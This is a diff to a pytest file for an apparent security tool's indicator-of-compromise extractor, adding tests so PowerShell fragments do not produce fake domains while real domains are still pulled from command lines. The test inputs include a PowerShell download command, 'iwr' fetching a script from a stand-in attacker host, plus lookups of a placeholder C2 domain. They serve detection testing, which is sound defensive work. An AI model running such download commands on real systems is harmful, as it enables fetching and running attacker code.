@@ -68,3 +68,23 @@ def test_sha256_preferred_over_md5():
     ev = to_canonical({"_time": "2026-08-11T06:37:25Z", "EventCode": "1",
                        "Hashes": "MD5=" + "a" * 32 + ",SHA256=" + "b" * 64})
     assert extract_iocs(ev) == ["b" * 64]
+
+
+def test_script_code_does_not_produce_pseudo_domains():
+    from app.normalization.ioc import _text_iocs
+
+    assert _text_iocs("$ms.Seek(0); New-Object -ComObject WScript.Shell; $service.Name") == []
+
+
+def test_real_domains_in_command_lines_are_still_extracted():
+    from app.normalization.ioc import _text_iocs
+
+    assert "evil.example.com" in _text_iocs("iwr http://evil.example.com/a.ps1")
+    assert _text_iocs("ping evil.example.com") == ["evil.example.com"]
+    assert _text_iocs("nslookup c2.example.org") == ["c2.example.org"]
+
+
+def test_real_4104_rows_yield_no_pseudo_tld_domains(splunk_rows):
+    for row in splunk_rows["4104"]:
+        iocs = extract_iocs(to_canonical(row))
+        assert not [i for i in iocs if i.endswith((".shell", ".seek", ".name"))], iocs
